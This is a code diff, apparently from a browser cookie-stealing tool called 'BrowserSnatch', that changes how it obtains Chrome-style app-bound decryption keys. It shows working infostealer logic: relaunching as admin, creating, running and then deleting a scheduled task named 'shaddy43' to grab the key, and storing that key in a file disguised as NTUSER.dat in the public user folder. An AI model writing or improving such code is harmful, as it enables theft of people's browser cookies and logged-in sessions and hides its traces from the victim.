@@ -161,20 +161,33 @@ BOOL app_bound_browsers_cookie_collector(std::string username, std::string steal
 		RestartAsAdmin("-app-bound-decryption");
 	}
 
-	std::wstring TaskName = StringToWString("shaddy43");
-	std::wstring Path = GetExecutablePath();
-	std::string combine_arg = "-app-bound-decryption -service " + username;
-	std::wstring Argument = StringToWString(combine_arg);
+	//Decrypt key variables
+	std::string service_data_path = "c:\\users";
+	service_data_path += "\\public\\";
+	service_data_path += "NTUSER.dat";
 
-	if (!CreateScheduledTask(TaskName, Path, Argument))
-		return false;
+	//---------------------
+	//Avoiding key snatching through COM if file already exists
+	//Personal Note: Need a recalibrate function for BrowserSnatch
 
-	Sleep(500);
-	if (!RunScheduledTask(TaskName))
-		return false;
+	if (!file_exist(service_data_path))
+	{
+		//Initiate Key Snatching
+		std::wstring TaskName = StringToWString("shaddy43");
+		std::wstring Path = GetExecutablePath();
+		std::string combine_arg = "-app-bound-decryption -service " + username;
+		std::wstring Argument = StringToWString(combine_arg);
 
-	Sleep(3000);
-	DeleteScheduledTask(TaskName);
+		if (!CreateScheduledTask(TaskName, Path, Argument))
+			return false;
+
+		Sleep(500);
+		if (!RunScheduledTask(TaskName))
+			return false;
+
+		Sleep(3000);
+		DeleteScheduledTask(TaskName);
+	}
 
 	std::vector<DataHolder> data_list;
 	std::string target_user_data;
@@ -234,11 +247,6 @@ BOOL app_bound_browsers_cookie_collector(std::string username, std::string steal
 						continue;
 					}
 				}
-
-				//Decrypt key
-				std::string service_data_path = "c:\\users";
-				service_data_path += "\\public\\";
-				service_data_path += "NTUSER.dat";
 
 				if (!waitForFile(service_data_path, 3000, 100))
 					continue;
